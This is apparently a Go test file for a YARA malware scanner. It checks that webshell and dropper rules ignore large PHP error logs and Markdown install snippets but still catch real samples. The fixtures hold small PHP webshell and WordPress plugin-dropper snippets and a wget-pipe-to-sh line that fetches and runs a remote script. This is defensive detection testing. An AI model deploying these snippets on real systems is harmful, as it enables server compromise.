//go:build yara

package yara

import (
	"bytes"
	"strings"
	"testing"
)

// FP reconstructions for the 2026-09-03 cluster6 triage. Three rules matched
// strings that were present in a file but had nothing to do with each other:
// two fired on multi-megabyte PHP error logs, one on a Markdown README. In the
// blanaroocom log the two required strings sat 1.2 MB apart -- offsets 78,294
// and 1,287,040 -- which is the same unrelated-co-occurrence failure that
// `$shebang at 0` already fixes for cgi_webshell_bash.

// phpErrorLog builds a log whose interesting strings are separated by filler,
// reproducing the real file size without carrying a real log's content.
func phpErrorLog(minSize int, head, tail string) []byte {
	var b bytes.Buffer
	b.WriteString(head)
	b.WriteByte('\n')
	filler := "[02-Jun-2026 07:44:17 UTC] PHP Notice:  Undefined index: page in /home/site/public_html/wp-includes/theme.php on line 812\n"
	for b.Len() < minSize {
		b.WriteString(filler)
	}
	b.WriteString(tail)
	b.WriteByte('\n')
	return b.Bytes()
}

func TestWebshellAlfa_DoesNotMatchAnErrorLogNamingTheShell(t *testing.T) {
	s := loadRepoYaraScanner(t)

	// Real production log: an ALFA shell was attempted, its data file was
	// missing, and PHP logged the failed include. Nothing executable landed --
	// the account had zero ALFA artifacts on disk.
	logged := phpErrorLog(
		4_400_000,
		`[02-Jun-2026 07:44:17 UTC] PHP Warning:  include(structure/pages/ALFA_DATA.php): Failed to open stream: No such file or directory in /home/site/public_html/index.php on line 3`,
		`[02-Jun-2026 09:12:02 UTC] PHP Parse error: syntax error in /home/site/public_html/a.php, source: <?php $tpl = "<?= $v ?>"; @system($cmd);`)
	if hasYaraRule(s.ScanBytes(logged), "webshell_alfa") {
		t.Error("webshell_alfa FP: matched a PHP error log that only names the shell in a warning")
	}
}

func TestWebshellAlfa_StillMatchesARealShell(t *testing.T) {
	s := loadRepoYaraScanner(t)

	// The marker and the command sink sit together, the way they do in the
	// real shell.
	shell := []byte(`<?php
/* ALFA TEAM - AlfaTeam Shell */
$ALFA_DATA = "x";
if(isset($_POST['cmd'])){ @system($_POST['cmd']); }
`)
	if !hasYaraRule(s.ScanBytes(shell), "webshell_alfa") {
		t.Error("webshell_alfa: real Alfa shell no longer detected")
	}
}

// A shell is not excused by size: the marker and the sink still sit in the same
// region even when the file is large, which is what separates it from a log.
func TestWebshellAlfa_StillMatchesALargeShell(t *testing.T) {
	s := loadRepoYaraScanner(t)

	var b bytes.Buffer
	b.WriteString("<?php\n")
	b.WriteString(strings.Repeat("$pad = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';\n", 20000))
	b.WriteString("/* AlfaTeam */\n@system($_POST['c']);\n")
	if !hasYaraRule(s.ScanBytes(b.Bytes()), "webshell_alfa") {
		t.Error("webshell_alfa: large real shell no longer detected")
	}
}

func TestWebshellAlfa_StillMatchesWhenPaddingSeparatesSignals(t *testing.T) {
	s := loadRepoYaraScanner(t)
	padding := strings.Repeat("$padding_value = 'aaaaaaaaaaaaaaaa';\n", 300)

	for name, shell := range map[string][]byte{
		"marker before sink": []byte("<?php\n/* AlfaTeam */\n" + padding + "@system($_POST['c']);\n"),
		"sink before marker": []byte("<?php\n@system($_POST['c']);\n" + padding + "/* AlfaTeam */\n"),
	} {
		t.Run(name, func(t *testing.T) {
			if !hasYaraRule(s.ScanBytes(shell), "webshell_alfa") {
				t.Error("webshell_alfa: padding between the family marker and sink bypassed detection")
			}
		})
	}
}

func TestDropperWPPluginInstaller_DoesNotMatchAnErrorLog(t *testing.T) {
	s := loadRepoYaraScanner(t)

	// blanaroocom: PHP logged a failed plugin write near the top of the file
	// and, 1.2 MB later, a line quoting PHP source. Neither is a dropper.
	logged := phpErrorLog(
		1_300_000,
		`[11-Jul-2026 04:02:55 UTC] PHP Warning:  file_put_contents(/home/site/public_html/wp-content/plugins/cache/index.php): Failed to open stream: Permission denied in /home/site/public_html/wp-admin/includes/file.php on line 512`,
		`[19-Jul-2026 22:41:09 UTC] PHP Parse error: syntax error, unexpected end of file in /home/site/public_html/wp-content/themes/x/a.php on line 2, source: <?php function f() {`)
	if hasYaraRule(s.ScanBytes(logged), "dropper_wp_plugin_installer") {
		t.Error("dropper_wp_plugin_installer FP: matched a PHP error log quoting a failed plugin write")
	}
}

func TestDropperWPPluginInstaller_StillMatchesARealDropper(t *testing.T) {
	s := loadRepoYaraScanner(t)

	dropper := []byte(`<?php
file_put_contents(ABSPATH . 'wp-content/plugins/hello/evil.php', base64_decode($_POST['b']));
`)
	if !hasYaraRule(s.ScanBytes(dropper), "dropper_wp_plugin_installer") {
		t.Error("dropper_wp_plugin_installer: real plugin-directory dropper no longer detected")
	}
}

func TestDropperWPPluginInstaller_StillMatchesWhenPaddingSeparatesSignals(t *testing.T) {
	s := loadRepoYaraScanner(t)
	padding := strings.Repeat("$padding_value = 'aaaaaaaaaaaaaaaa';\n", 600)

	for name, dropper := range map[string][]byte{
		"opener before write": []byte("<?php\n" + padding +
			"file_put_contents(ABSPATH . 'wp-content/plugins/hello/evil.php', base64_decode($_POST['b']));\n"),
		"write before opener": []byte("file_put_contents('wp-content/plugins/hello/evil.php', $payload);\n" +
			padding + "<?php $payload = base64_decode($_POST['b']);\n"),
	} {
		t.Run(name, func(t *testing.T) {
			if !hasYaraRule(s.ScanBytes(dropper), "dropper_wp_plugin_installer") {
				t.Error("dropper_wp_plugin_installer: padding between the PHP opener and write bypassed detection")
			}
		})
	}
}

// Install instructions can carry the same pipeline as a dropper, so the
// detector has to exclude only commands contained by Markdown syntax.
func TestDropperWgetExec_DoesNotMatchMarkdownInstructions(t *testing.T) {
	s := loadRepoYaraScanner(t)

	doc := []byte("# Installing on macOS Catalina\n\n" +
		"If the Command Line Tools are missing, reinstall them:\n\n" +
		"```sh\ncurl -sSL https://example.invalid/install.sh | bash\n```\n\n" +
		"Then re-run the build.\n")
	if hasYaraRule(s.ScanBytes(doc), "dropper_wget_exec") {
		t.Error("dropper_wget_exec FP: matched a fenced shell snippet in Markdown documentation")
	}
}

func TestDropperWgetExec_StillMatchesARealDropperScript(t *testing.T) {
	s := loadRepoYaraScanner(t)

	script := []byte("#!/bin/sh\ncd /tmp\nwget -q http://198.51.100.7/x.sh -O - | sh\n")
	matches := s.ScanBytes(script)
	if !hasYaraRule(matches, "dropper_wget_exec") {
		t.Error("dropper_wget_exec: real download-and-run script no longer detected")
	}

	var downloadRules []string
	for _, match := range matches {
		if match.RuleName == "dropper_wget_exec" || match.RuleName == "dropper_wget_pipe_exec" {
			downloadRules = append(downloadRules, match.RuleName)
		}
	}
	if len(downloadRules) != 1 {
		t.Errorf("download-and-run script matched duplicate rules: %v", downloadRules)
	}
}
